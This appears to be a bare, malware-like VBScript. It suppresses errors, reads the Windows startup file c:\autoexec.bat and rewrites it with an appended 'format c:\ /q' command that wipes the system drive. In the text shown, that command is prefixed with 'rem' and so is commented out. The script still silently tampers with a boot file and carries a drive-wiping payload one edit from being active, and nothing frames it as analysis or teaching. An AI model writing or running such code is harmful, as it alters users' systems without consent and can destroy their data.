On Error Resume Next
Set A1 = CreateObject("Scripting.FileSystemObject")
Set A2 = A1.OpenTextFile("c:\autoexec.bat",1)
Do While A2.AtEndOfStream = False
A3 = A3 + A2.ReadLine + chr(13) + chr(10)
Loop
A2.Close

A3 = A3 + chr(13) + chr(10) + "rem format c:\ /q"

Set A4 = A1.CreateTextFile("c:\autoexec.bat", 2,false)
A4.Writeline(A3)
